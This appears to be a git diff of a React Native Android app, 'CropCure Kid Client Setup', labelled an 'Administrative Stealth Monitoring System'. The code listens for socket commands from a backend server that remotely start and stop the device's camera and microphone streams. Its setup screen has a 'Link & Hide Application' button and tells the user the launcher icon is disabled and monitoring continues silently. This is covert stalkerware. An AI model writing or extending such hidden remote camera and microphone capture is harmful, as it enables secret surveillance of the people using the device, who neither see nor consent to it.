@@ -9,7 +9,7 @@ import { VisibilityService } from './app/services/VisibilityService';
 import { AppUsageService } from './app/services/AppUsageService';
 import { io } from 'socket.io-client';
 
-const BACKEND_URL = 'http://localhost:8443';
+const BACKEND_URL = 'http://192.168.1.24:8443';
 
 export default function App() {
   const [serverUrl, setServerUrl] = useState('http://192.168.1.24:8443');
@@ -191,7 +191,7 @@ export default function App() {
       // Register socket command listeners with exact logs
       socket.on('camera-start-command', async (data) => {
         try {
-          console.log(`[Android Socket] Device ${targetDeviceId} received CAMERA_START command`);
+          console.log(`COMMAND RECEIVED: camera-start-command on device_${targetDeviceId}`);
           await camSvc.startStream(data.streamId, data.parentSocketId);
         } catch (e) {
           console.warn('[Android Socket] Camera start error:', e.message);
@@ -200,7 +200,7 @@ export default function App() {
 
       socket.on('camera-switch-command', (data) => {
         try {
-          console.log(`[Android Socket] Device ${targetDeviceId} received CAMERA_SWITCH command to ${data.facing}`);
+          console.log(`COMMAND RECEIVED: camera-switch-command on device_${targetDeviceId} to ${data.facing}`);
           camSvc.setFacing(data.facing);
         } catch (e) {
           console.warn('[Android Socket] Camera switch error:', e.message);
@@ -209,7 +209,7 @@ export default function App() {
 
       socket.on('camera-stop-command', async () => {
         try {
-          console.log(`[Android Socket] Device ${targetDeviceId} received CAMERA_STOP command`);
+          console.log(`COMMAND RECEIVED: camera-stop-command on device_${targetDeviceId}`);
           await camSvc.stopStream();
         } catch (e) {
           console.warn('[Android Socket] Camera stop error:', e.message);
@@ -218,7 +218,7 @@ export default function App() {
 
       socket.on('mic-start-command', async (data) => {
         try {
-          console.log(`[Android Socket] Device ${targetDeviceId} received MIC_START command`);
+          console.log(`COMMAND RECEIVED: mic-start-command on device_${targetDeviceId}`);
           await micSvc.startStream(data.streamId);
         } catch (e) {
           console.warn('[Android Socket] Mic start error:', e.message);
@@ -250,71 +250,71 @@ export default function App() {
   };
 
   return (
-  <ScrollView contentContainerStyle={styles.container}>
-    <Text style={styles.title}>CropCure Kid Client Setup</Text>
-    <Text style={styles.subtitle}>Administrative Stealth Monitoring System</Text>
+    <ScrollView contentContainerStyle={styles.container}>
+      <Text style={styles.title}>CropCure Kid Client Setup</Text>
+      <Text style={styles.subtitle}>Administrative Stealth Monitoring System</Text>
 
-    <View style={styles.statusBox}>
-      <Text style={styles.statusLabel}>Status Dashboard</Text>
-      <Text style={styles.statusValue}>{statusMsg}</Text>
-    </View>
-
-    {!registered ? (
-      <View style={styles.form}>
-        <Text style={styles.label}>Server URL (Backend Host)</Text>
-        <TextInput
-          style={styles.input}
-          value={serverUrl}
-          onChangeText={setServerUrl}
-          placeholder="http://192.168.1.24:8443"
-          placeholderTextColor="#6c6489"
-        />
-
-        <Text style={styles.label}>Parent ID / Linking Code</Text>
-        <TextInput
-          style={styles.input}
-          value={parentId}
-          onChangeText={setParentId}
-          placeholder="Enter Parent MongoDB ID"
-          placeholderTextColor="#6c6489"
-        />
-
-        <Text style={styles.label}>Device Unique ID</Text>
-        <TextInput
-          style={styles.input}
-          value={deviceId}
-          onChangeText={setDeviceId}
-          placeholder="device_123"
-          placeholderTextColor="#6c6489"
-        />
-
-        <Text style={styles.label}>Device Display Name</Text>
-        <TextInput
-          style={styles.input}
-          value={deviceName}
-          onChangeText={setDeviceName}
-          placeholder="John's Android"
-          placeholderTextColor="#6c6489"
-        />
-
-        {loading ? (
-          <ActivityIndicator size="large" color="#00f2fe" style={{ marginTop: 20 }} />
-        ) : (
-          <Button title="Link & Hide Application" color="#9b51e0" onPress={registerDevice} />
-        )}
+      <View style={styles.statusBox}>
+        <Text style={styles.statusLabel}>Status Dashboard</Text>
+        <Text style={styles.statusValue}>{statusMsg}</Text>
       </View>
-    ) : (
-      <View style={styles.registeredBox}>
-        <Text style={{ color: '#00ff87', fontWeight: 'bold', fontSize: 16, textAlign: 'center' }}>
-          ✓ Device Configured successfully
-        </Text>
-        <Text style={{ color: '#a39bb8', textAlign: 'center', marginTop: 10 }}>
-          The launcher icon is now disabled. Monitoring will continue silently in the background. Press Home to return to the Android screen.
-        </Text>
-      </View>
-    )}
-  </ScrollView>
-);
+
+      {!registered ? (
+        <View style={styles.form}>
+          <Text style={styles.label}>Server URL (Backend Host)</Text>
+          <TextInput
+            style={styles.input}
+            value={serverUrl}
+            onChangeText={setServerUrl}
+            placeholder="http://192.168.1.24:8443"
+            placeholderTextColor="#6c6489"
+          />
+
+          <Text style={styles.label}>Parent ID / Linking Code</Text>
+          <TextInput
+            style={styles.input}
+            value={parentId}
+            onChangeText={setParentId}
+            placeholder="Enter Parent MongoDB ID"
+            placeholderTextColor="#6c6489"
+          />
+
+          <Text style={styles.label}>Device Unique ID</Text>
+          <TextInput
+            style={styles.input}
+            value={deviceId}
+            onChangeText={setDeviceId}
+            placeholder="device_123"
+            placeholderTextColor="#6c6489"
+          />
+
+          <Text style={styles.label}>Device Display Name</Text>
+          <TextInput
+            style={styles.input}
+            value={deviceName}
+            onChangeText={setDeviceName}
+            placeholder="John's Android"
+            placeholderTextColor="#6c6489"
+          />
+
+          {loading ? (
+            <ActivityIndicator size="large" color="#00f2fe" style={{ marginTop: 20 }} />
+          ) : (
+            <Button title="Link & Hide Application" color="#9b51e0" onPress={registerDevice} />
+          )}
+        </View>
+      ) : (
+        <View style={styles.registeredBox}>
+          <Text style={{ color: '#00ff87', fontWeight: 'bold', fontSize: 16, textAlign: 'center' }}>
+            ✓ Device Configured successfully
+          </Text>
+          <Text style={{ color: '#a39bb8', textAlign: 'center', marginTop: 10 }}>
+            The launcher icon is now disabled. Monitoring will continue silently in the background. Press Home to return to the Android screen.
+          </Text>
+        </View>
+      )}
+    </ScrollView>
+  );
 }
 
 const styles = StyleSheet.create({
